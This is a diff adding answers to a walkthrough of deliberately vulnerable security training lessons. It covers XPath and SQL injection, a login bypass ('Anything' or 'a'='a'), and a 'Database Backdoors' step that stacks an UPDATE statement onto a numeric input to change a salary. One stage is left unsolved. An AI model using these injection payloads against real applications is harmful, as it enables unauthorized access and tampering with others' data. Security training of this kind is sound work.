@@ -171,6 +171,12 @@ Start OWASP Proxy and open a browser (I am using firefox) that is preconfigured 
        is because the XPATH interprets it as:
        expression="/employees/employee[(loginID/text()='Smith' or 1=1) OR ('a'='a' and passwd/text()='password')]"
    9.5 String SQL injection
-   A.  This is a standard SQL Injection flaw. Enter "Smith' 'a'='a" without quotes
-   9.6 LAB: SQL Injection
-   A.  
+   A.  This is a standard SQL Injection flaw. Enter "Smith' or 'a'='a" without quotes
+   9.6 LAB: SQL Injection (Stage 1)
+   A.  Select Neville as user name and put "Anything' or 'a'='a" as password.
+   9.7 LAB: SQL Injection (Stage 3)
+   A.  No Solution could be figured WITHOUT
+   9.8 Database Backdoors
+   A.  First Step: enter "101 or 1=1" without quotes and check your data.
+       Second: Enter "101 or 1=1; UPDATE employee SET Salary=100000 WHERE userid=101"
+       This will update the row entry in database. 
